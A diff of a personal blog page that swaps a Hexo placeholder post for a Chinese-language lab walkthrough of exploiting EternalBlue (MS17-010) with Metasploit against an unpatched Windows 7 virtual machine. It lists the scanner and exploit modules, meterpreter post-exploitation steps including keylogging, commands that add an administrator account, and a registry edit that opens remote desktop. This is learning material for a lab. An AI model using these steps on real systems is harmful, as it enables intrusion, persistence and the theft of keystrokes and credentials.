@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>Hello World | k-onlの狗窝</title>
+    <title>永恒之蓝漏洞复现 | k-onlの狗窝</title>
     <meta name="author" content="k-onl" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -142,33 +142,62 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>Hello World</h1>
+        <h1>永恒之蓝漏洞复现</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2023/11/14
+            2023/11/15
         </span>
         
         
     </div>
     
     <div class="content" v-pre>
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+        <p>漏洞复现<br>1，准备kali-linux 和windows7（未装补丁）两个虚拟机</p>
+<p>2，确保kali-linux 和 windows7 两个虚拟机都为桥接模式</p>
+<p>3，Kali-Linux改为以root用户登录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231115195938777.png" alt="image-20231115195938777"></p>
+<p>4，查看Windows7和kali-Linux的IP地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231115195947547.png" alt="image-20231115195947547"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231115195953728.png" alt="image-20231115195953728"></p>
+<p>5，通过ping命令，测试两台虚拟机是否能连通</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231115200006956.png" alt="image-20231115200006956"></p>
+<p>6，kali-linux输入msfconsole启动msf（若不是root登陆需sudo提升权限） 。#msfconsole会启动metasploit，命令提示行显示msf则启动成功。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231115200013464.png" alt="image-20231115200013464"></p>
+<p>7，输入search ms17-010查看漏洞模块</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231115200020898.png" alt="image-20231115200020898"></p>
+<p><strong>3 auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</strong></p>
+<p>是永恒之蓝扫描模块，探测主机是否存在ms17-010漏洞。</p>
+<p><strong>0 exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</strong></p>
+<p>是永恒之蓝攻击代码，一般两者配合使用，前者先扫描，若是显示有漏洞，再进行攻击。</p>
+<p>8，扫描过程</p>
+<p>可以使用use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010或者use 3命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231115200105018.png" alt="image-20231115200105018"></p>
+<p>9，攻击过程</p>
+<p>可以使用use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue或者use 0命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231115200112462.png" alt="image-20231115200112462"></p>
+<p>10，显示远程主机系统信息： sysinfo</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231115200124552.png" alt="image-20231115200124552"></p>
+<p>11，通过 meterpreter 获取屏幕快照： screenshot</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231115200144978.png" alt="image-20231115200144978"></p>
+<p>12，上传文件到Windows主机，并从Windows主机中下载文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231115200206916.png" alt="image-20231115200206916"></p>
+<p>上传文件：upload kali的文件地址 Windows的保存路径</p>
+<p>下载文件 ：download kali的保存路径 windows的文件地址</p>
+<p>13，添加用户并到管理员组<br>net user uname pass &#x2F;add 添加用户名为name，密码为pass<br>net localgroup Administrators uname &#x2F;add 将用户名为uname的用户添加到管理员组<br>net user uname &#x2F;del 删除uname用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231115200220215.png" alt="image-20231115200220215"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231115200238795.png" alt="image-20231115200238795"></p>
+<p>14，键盘监听</p>
+<p>ps 看（explorer.exe）进程号</p>
+<p>migrate 1892（进程号） 迁移</p>
+<p>keyscan_start 键盘监听</p>
+<p>keyscan_dump 看键盘输入了什么</p>
+<p>15，远程登陆目标主机</p>
+<p>C:\WINDOWS\system32&gt;net user admin &#x2F;active:yes<br>开启远程管理服务<br>C:\Windows\system32&gt;reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231115200249173.png" alt="image-20231115200249173"></p>
 
     </div>
     
